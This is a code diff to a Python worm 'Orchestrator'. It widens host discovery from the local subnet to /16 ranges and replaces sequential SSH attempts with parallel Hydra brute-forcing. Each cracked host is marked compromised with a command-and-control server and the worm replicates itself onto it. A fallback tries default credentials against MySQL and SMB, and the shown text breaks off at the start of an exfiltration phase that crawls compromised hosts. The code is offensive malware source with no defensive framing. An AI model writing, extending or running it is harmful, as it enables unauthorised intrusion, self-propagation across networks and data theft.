@@ -86,21 +86,6 @@ class Orchestrator:
 
         self.phase += 1
 
-    def _phase_survey(self):
-        """Discover local subnet and scan targets."""
-        subnet = self.net.get_local_subnet()
-        logger.info("Scanning subnet: %s", subnet)
-        hosts = self.net.ping_sweep(subnet)
-        logger.info("Discovered %d hosts", len(hosts))
-        for host in hosts:
-            if host in self.compromised:
-                continue
-            ports = self.net.quick_scan(host)
-            if ports:
-                self.targets.append({'ip': host, 'ports': ports})
-        for t in self.targets:
-            self.c2.upload_target(t)
-
     def _fallback_actions(self, ip, services):
         """Generate attack actions from service list (offline rules)."""
         actions = []
@@ -123,23 +108,43 @@ class Orchestrator:
             actions = self._fallback_actions(target['ip'], svc)
             target['actions'] = actions
 
+    def _phase_survey(self):
+        """Discover local subnet and expand to /16."""
+        ip = self.net.get_local_ip()
+        subnets = self.net.get_expanded_subnets(ip)
+        for subnet in subnets:
+            logger.info("Scanning subnet: %s", subnet)
+            hosts = self.net.ping_sweep(subnet)
+            logger.info("Discovered %d hosts in %s", len(hosts), subnet)
+            for host in hosts:
+                if host in self.compromised:
+                    continue
+                ports = self.net.quick_scan(host)
+                if ports:
+                    self.targets.append({'ip': host, 'ports': ports})
+        for t in self.targets:
+            self.c2.upload_target(t)
+
     def _phase_escalate(self):
-        """Execute attack plans with Hydra first, then fallback."""
+        """Parallel Hydra on all SSH targets, then fallback."""
+        # Collect targets with port 22 open
+        ssh_targets = [
+            t for t in self.targets
+            if 22 in t.get('ports', []) and t['ip'] not in self.compromised
+        ]
+        if ssh_targets:
+            results = self.ap.brute_force_parallel(ssh_targets)
+            for ip, creds in results.items():
+                user, password = creds[0]
+                if self.ap.brute_ssh(ip, user, password):
+                    self.compromised.add(ip)
+                    self.wr.replicate(ip, self.parent_ip or '0.0.0.0')
+                    self.c2.mark_compromised(ip)
+
+        # Fallback for other services (MySQL, SMB) or if no SSH found
         for target in self.targets:
             if target['ip'] in self.compromised:
                 continue
-
-            # ---- Hydra brute-force (port 22) ----
-            found_creds = self.ap.brute_force_hydra(target['ip'], 22, 'ssh')
-            if found_creds:
-                user, password = found_creds[0]
-                if self.ap.brute_ssh(target['ip'], user, password, 22):
-                    self.compromised.add(target['ip'])
-                    self.wr.replicate(target['ip'], self.parent_ip or '0.0.0.0')
-                    self.c2.mark_compromised(target['ip'])
-                    continue
-
-            # ---- Fallback: sequential default credentials ----
             for action in target.get('actions', []):
                 if action['type'] == 'brute':
                     success = self.ap.brute_ssh(action['target'], action['user'], action['pass'])
@@ -154,7 +159,6 @@ class Orchestrator:
                     self.wr.replicate(target['ip'], self.parent_ip or '0.0.0.0')
                     self.c2.mark_compromised(target['ip'])
                     break
-
     def _phase_exfiltrate(self):
         """Run deep crawler on compromised hosts (local AND remote)."""
         # Local file crawler
